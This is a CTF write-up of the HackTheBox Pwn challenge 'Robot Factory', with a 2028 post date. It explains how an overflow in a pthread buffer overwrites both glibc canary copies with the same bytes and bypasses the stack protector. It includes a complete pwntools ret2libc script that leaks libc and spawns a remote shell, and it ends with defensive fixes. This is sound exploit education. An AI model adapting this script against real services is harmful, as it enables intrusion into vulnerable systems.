---
layout: post
title: "Robot Factory"
date: 2028-04-23 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, stack-canary, pthread, ret2libc, rop, glibc]
description: "A threaded factory service leaks its 264-byte worker buffer. Because glibc seeds every thread's stack canary from the master canary, overwriting both copies with the same bytes sails past the guard — then it's a textbook No-PIE ret2libc, with two thread-specific tweaks."
---

## Overview

Robot Factory is a Medium HackTheBox Pwn challenge. You get an x86-64 binary (`robot_factory`) and its `libc.so.6` (glibc 2.31). The binary is No-PIE with NX, Partial RELRO, and a **stack canary** — normally enough to stop a plain overflow. The catch is that the vulnerable buffer lives on a **worker thread's** stack, and that changes what the canary is worth. The path is: overflow the thread buffer, defeat the canary without leaking it, then a two-round ROP — leak libc, then pop a shell.

## The technique

The service lets you build "robots" that are either numbers or strings, and apply an operation (add / subtract / multiply). String robots run in a pthread (`do_string`). The multiply operation concatenates your input `count` times into a fixed **264-byte** thread buffer with a `memcpy` loop that has **no length check** — a classic [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html).

The interesting part is the canary. A stack canary only helps if the bytes written over it *differ* from the reference value checked in the function epilogue. In a threaded program that reference lives in the thread's TLS block, and glibc initialises every new thread's TLS canary as an **exact copy of the master (main-thread) canary**. So if the overflow reaches both the on-stack saved canary *and* the TLS master canary, overwriting **both with the same bytes** (e.g. eight `A`s) makes `__stack_chk_fail`'s comparison still succeed. No canary leak is required. Repeating a 248-byte payload paints both copies identically, then we continue over the saved return address (32 bytes of padding to RIP).

## Solution

Everything is at a fixed address because the binary is No-PIE, so gadgets and PLT/GOT entries are constant. The exploit runs in two rounds against the live instance.

**Round 1 — leak libc.** ROP `pop rdi; ret` → `printf@GOT`, then `puts@plt` to print it, then `sleep@plt`. The chain ends in `sleep` (which re-enters the thread's menu loop) rather than a bare `ret`, because a worker thread has no clean `main()` frame to return into. From the leaked `printf` address we compute the libc base.

**Round 2 — shell.** ROP `execve("/bin/sh", 0, 0)`: `pop rdi = /bin/sh`, `pop rsi = 0`, `pop rdx; pop r12 = 0`, then `execve`. We use `execve` rather than `system` because `system`'s `fork`/`SIGCHLD` handling is unreliable inside a worker thread.

The full solve script:

```python
#!/usr/bin/env python3
import sys
from pwn import *

context.binary = elf = ELF('robot_factory', checksec=False)   # No-PIE: gadgets/PLT/GOT fixed
glibc = ELF('libc.so.6', checksec=False)                       # provided libc, for offsets


def get_process():
    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def create_robot(p, kind, operation, a, b):
    p.recv(timeout=0.2)
    p.sendline(kind)
    p.sendlineafter(b'(a/s/m) > ', operation)
    p.sendlineafter(b': ', a)
    p.sendlineafter(b': ', b)


def main():
    p = get_process()
    rop = ROP(elf)

    chain  = p64(rop.rdi.address)
    chain += p64(elf.got.printf)
    chain += p64(elf.plt.puts)
    chain += p64(elf.plt.sleep)
    payload = b'A' * 32 + chain
    payload += b'A' * (248 - len(payload))
    create_robot(p, b's', b'm', payload, b'9')          # both canaries -> 'AAAA...' -> check passes

    printf_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))
    glibc.address = printf_addr - glibc.sym.printf

    rop = ROP([elf, glibc])
    chain  = p64(rop.rdi.address) + p64(next(glibc.search(b'/bin/sh')))
    chain += p64(rop.rsi.address) + p64(0)
    chain += p64(rop.find_gadget(['pop rdx', 'pop r12', 'ret']).address) + p64(0) + b'A' * 8
    chain += p64(glibc.sym.execve)
    payload = b'A' * 32 + chain
    payload += b'A' * (248 - len(payload))
    create_robot(p, b's', b'm', payload, b'9')

    p.interactive()


if __name__ == '__main__':
    main()
```

Running it against the instance drops into a shell as the `ctf` user and the flag is right there:

```console
$ python3 solve.py <host>:<port>
[+] glibc base: 0x7f...000
$ cat flag*
HTB{...}
```

## Why it worked

The canary defense assumes its reference value is secret and unique per stack. Threading quietly breaks that: the thread's TLS canary is a *copy* of the master canary, so an overflow that spans both writes the same value over both, and the epilogue's equality check passes. Everything after that is a standard No-PIE ret2libc — the only thread-specific adjustments are returning into the menu loop instead of `main`, and choosing `execve` over `system`.

## Fix / defense

- **Bound the copy.** The real bug is an unbounded concatenation loop — cap total length against the buffer size instead of trusting a caller-supplied `count`.
- Build with PIE + Full RELRO so the ROP gadget / GOT surface is randomised and read-only.
- Keep thread buffers small and split work so attacker data can't span both canary copies.
- Prefer memory-safe string handling (`std::string`, `snprintf`) over raw `memcpy` accumulation.
